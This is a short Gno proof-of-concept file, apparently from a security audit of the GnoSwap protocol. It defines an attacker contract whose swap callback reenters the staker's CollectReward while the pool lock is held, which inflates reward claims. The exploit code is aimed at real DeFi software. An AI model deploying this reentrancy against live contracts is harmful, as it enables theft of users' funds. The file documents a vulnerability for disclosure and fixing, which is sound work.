
// poc/h01_evil_realm.gno — attacker realm that will be the swapCallback
package evil

import (
    "gno.land/r/gnoswap/pool/v1" as pool
    "gno.land/r/gnoswap/staker/v1" as staker
    pl "gno.land/r/gnoswap/pool"
)

func BalanceCallback(cur realm, amount0Delta, amount1Delta int64, _ *pl.CallbackMarker) error {
    // amount0Delta >0 means pool expects token0; we DO pay it so balanceIncrease check passes
    // But BEFORE paying, we reenter staker while pool lock still held:
    callerPos := uint64(1) // attacker's staked position
    // This should REVERT with errLockedPool if guard existed — but it DOES NOT.
    // STAKER has only halt.AssertIsNotHaltedWithdraw + assertIsDepositor, no pool lock check.
    staker.CollectReward(cur, callerPos) // reentrant CollectReward on pre-swap globalAcc
    // then pay input token:
    // common.SafeGRC20Transfer(cross(cur), token0Path, poolAddr, amount0Delta)
    return nil
}
